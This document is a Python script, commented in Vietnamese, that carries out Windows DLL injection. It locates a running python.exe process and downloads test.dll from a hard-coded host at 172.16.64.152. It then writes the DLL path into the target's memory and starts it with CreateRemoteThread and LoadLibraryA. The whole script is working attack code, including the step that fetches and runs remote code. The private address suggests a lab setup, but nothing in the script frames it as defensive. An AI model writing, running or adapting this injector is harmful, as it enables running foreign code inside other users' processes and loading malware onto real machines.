import os
import sys
import ctypes
from ctypes import wintypes
import urllib.request

# ==================== HẰNG SỐ ====================
PROCESS_ALL_ACCESS = 0x001FFFFF
MEM_COMMIT  = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
TH32CS_SNAPPROCESS = 0x00000002

# ==================== STRUCT ====================
class PROCESSENTRY32W(ctypes.Structure):
    _fields_ = [
        ("dwSize", wintypes.DWORD),
        ("cntUsage", wintypes.DWORD),
        ("th32ProcessID", wintypes.DWORD),
        ("th32DefaultHeapID", ctypes.c_void_p),
        ("th32ModuleID", wintypes.DWORD),
        ("cntThreads", wintypes.DWORD),
        ("th32ParentProcessID", wintypes.DWORD),
        ("pcPriClassBase", wintypes.LONG),
        ("dwFlags", wintypes.DWORD),
        ("szExeFile", wintypes.WCHAR * 260),
    ]

# ==================== KHAI BÁO API ====================
# Dùng windll thay vì WinDLL
kernel32 = ctypes.windll.kernel32

# Chỉ set argtypes/restype cho các hàm NGOẠI TRỪ CreateRemoteThread
kernel32.OpenProcess.restype = ctypes.c_void_p
kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]

kernel32.VirtualAllocEx.restype = ctypes.c_void_p
kernel32.VirtualAllocEx.argtypes = [
    ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t,
    wintypes.DWORD, wintypes.DWORD
]

kernel32.WriteProcessMemory.restype = wintypes.BOOL
kernel32.WriteProcessMemory.argtypes = [
    ctypes.c_void_p, ctypes.c_void_p, ctypes.c_char_p,
    ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)
]

kernel32.GetModuleHandleA.restype = ctypes.c_void_p
kernel32.GetModuleHandleA.argtypes = [ctypes.c_char_p]

kernel32.GetProcAddress.restype = ctypes.c_void_p
kernel32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]

# KHÔNG set argtypes cho CreateRemoteThread - truyền thủ công

kernel32.WaitForSingleObject.argtypes = [ctypes.c_void_p, wintypes.DWORD]

kernel32.CloseHandle.argtypes = [ctypes.c_void_p]

kernel32.CreateToolhelp32Snapshot.restype = ctypes.c_void_p
kernel32.CreateToolhelp32Snapshot.argtypes = [wintypes.DWORD, wintypes.DWORD]

kernel32.Process32FirstW.restype = wintypes.BOOL
kernel32.Process32FirstW.argtypes = [ctypes.c_void_p, ctypes.POINTER(PROCESSENTRY32W)]

kernel32.Process32NextW.restype = wintypes.BOOL
kernel32.Process32NextW.argtypes = [ctypes.c_void_p, ctypes.POINTER(PROCESSENTRY32W)]

# ==================== HÀM TÌM PID ====================
def get_pid_by_name(proc_name):
    hSnap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    pe32 = PROCESSENTRY32W()
    pe32.dwSize = ctypes.sizeof(PROCESSENTRY32W)
    if kernel32.Process32FirstW(hSnap, ctypes.byref(pe32)):
        while True:
            if pe32.szExeFile.lower() == proc_name.lower():
                pid = pe32.th32ProcessID
                kernel32.CloseHandle(hSnap)
                return pid
            if not kernel32.Process32NextW(hSnap, ctypes.byref(pe32)):
                break
    kernel32.CloseHandle(hSnap)
    return 0

# ==================== BƯỚC 1: TÌM TIẾN TRÌNH ====================
target = "python.exe"
print(f"[*] Bước 1: Tìm tiến trình {target}...")

pid = get_pid_by_name(target)
if not pid:
    print(f"[-] Không tìm thấy {target}.")
    sys.exit(1)
print(f"[+] PID: {pid}")

# ==================== TẢI DLL ====================
print("[*] Đang tải DLL...")

url = "http://172.16.64.152/test.dll"
urllib.request.urlretrieve(url, "test.dll")
dll_path = os.path.abspath("test.dll")
print(f"[+] DLL: {dll_path}")

dll_bytes = dll_path.encode('utf-8') + b'\x00'

# ==================== BƯỚC 2: MỞ TIẾN TRÌNH ====================
print("[*] Bước 2: OpenProcess...")

hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
if not hProcess:
    print(f"[-] OpenProcess thất bại. Err: {kernel32.GetLastError()}")
    sys.exit(1)
print(f"[+] hProcess = {hProcess} (type: {type(hProcess)})")

# Cấp phát bộ nhớ
addr = kernel32.VirtualAllocEx(hProcess, None, len(dll_bytes), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
if not addr:
    print(f"[-] VirtualAllocEx thất bại.")
    sys.exit(1)
print(f"[+] Bộ nhớ: {hex(addr)}")

# ==================== BƯỚC 3: GHI DLL PATH ====================
print("[*] Bước 3: WriteProcessMemory...")

written = ctypes.c_size_t(0)
kernel32.WriteProcessMemory(hProcess, addr, dll_bytes, len(dll_bytes), ctypes.byref(written))
print(f"[+] Đã ghi {written.value} bytes.")

# ==================== BƯỚC 4: CreateRemoteThread ====================
print("[*] Bước 4: CreateRemoteThread...")

h_kernel32 = kernel32.GetModuleHandleA(b"kernel32.dll")
load_lib = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")
print(f"[+] LoadLibraryA: {hex(load_lib)}")

# GỌI CreateRemoteThread KHÔNG dùng argtypes — truyền ctypes objects thủ công
thread_id = wintypes.DWORD(0)
hThread = kernel32.CreateRemoteThread(
    ctypes.c_void_p(hProcess),       # hProcess
    ctypes.c_void_p(0),              # lpThreadAttributes = NULL
    ctypes.c_size_t(0),              # dwStackSize = 0
    ctypes.c_void_p(load_lib),       # lpStartAddress = LoadLibraryA
    ctypes.c_void_p(addr),           # lpParameter = đường dẫn DLL
    wintypes.DWORD(0),               # dwCreationFlags = 0
    ctypes.byref(thread_id)          # lpThreadId
)

print(f"[DEBUG] hThread raw value = {hThread}")

if not hThread:
    print(f"[-] CreateRemoteThread thất bại. Err: {kernel32.GetLastError()}")
    kernel32.CloseHandle(hProcess)
    sys.exit(1)

print(f"[+] INJECT THÀNH CÔNG! Thread ID: {thread_id.value}")

kernel32.WaitForSingleObject(hThread, 5000)
kernel32.CloseHandle(hThread)
kernel32.CloseHandle(hProcess)

print("[+] Hoàn tất.")
